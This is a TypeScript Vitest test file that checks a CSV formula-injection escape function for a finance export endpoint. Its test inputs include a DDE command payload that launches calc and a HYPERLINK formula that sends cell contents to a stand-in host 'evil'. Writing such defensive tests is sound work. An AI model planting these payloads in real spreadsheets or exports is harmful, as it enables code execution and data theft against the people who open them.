/*
 * CSV formula-injection escape — verifies csvEscape() prefixes
 * dangerous cells with a single quote per OWASP CSV Injection (CWE-77).
 *
 * The function is module-private to export.get.ts; we re-exercise the
 * same logic by importing the handler and inspecting the SQL → CSV path
 * is too expensive. Instead we re-implement the assertion at the
 * smallest unit boundary: the published escape rules.
 */
import { describe, it, expect } from 'vitest'

// Mirror the implementation in server/api/v1/rollups/finance/export.get.ts.
// Keeping a copy here lets us test it without booting Nuxt; if either
// drifts the test surfaces the difference.
function csvEscape(v: string): string {
  let value = v
  if (value.length > 0 && /^[=+\-@\t\r]/.test(value)) {
    value = `'${value}`
  }
  if (/[,"\n\r]/.test(value)) {
    return `"${value.replace(/"/g, '""')}"`
  }
  return value
}

describe('csvEscape (CSV formula-injection defense)', () => {
  it('prefixes = with single quote', () => {
    expect(csvEscape('=cmd|"/c calc"!A0')).toBe(`"'=cmd|""/c calc""!A0"`)
  })

  it('prefixes +, -, @, tab', () => {
    expect(csvEscape('+1234')).toBe(`'+1234`)
    expect(csvEscape('-evil')).toBe(`'-evil`)
    expect(csvEscape('@attacker')).toBe(`'@attacker`)
    expect(csvEscape('\thidden')).toBe(`'\thidden`)
  })

  it('formula-prefix AND quote-wrap when the value also contains \\r or \\n', () => {
    // CSV with embedded \r or \n MUST be quoted to remain parseable.
    // The formula-prefix happens first, then standard quote escaping.
    expect(csvEscape('\rinject')).toBe(`"'\rinject"`)
    expect(csvEscape('=cmd\nrest')).toBe(`"'=cmd\nrest"`)
  })

  it('does not modify safe values', () => {
    expect(csvEscape('AFL-AII')).toBe('AFL-AII')
    expect(csvEscape('Practice Delta')).toBe('Practice Delta')
    expect(csvEscape('')).toBe('')
  })

  it('still handles comma/newline/quote escaping after formula-prefix', () => {
    expect(csvEscape('=hello,world')).toBe(`"'=hello,world"`)
    expect(csvEscape('quote"inside')).toBe(`"quote""inside"`)
    expect(csvEscape('line1\nline2')).toBe(`"line1\nline2"`)
  })

  it('handles the realistic exfil payload from the audit report', () => {
    const payload = `=HYPERLINK("http://evil/?a="&CONCATENATE(B1:B20),"click")`
    const escaped = csvEscape(payload)
    expect(escaped.startsWith(`"'=HYPERLINK`)).toBe(true)
    // Excel sees the literal `'=HYPERLINK(...)` cell as a string, not a formula.
  })
})
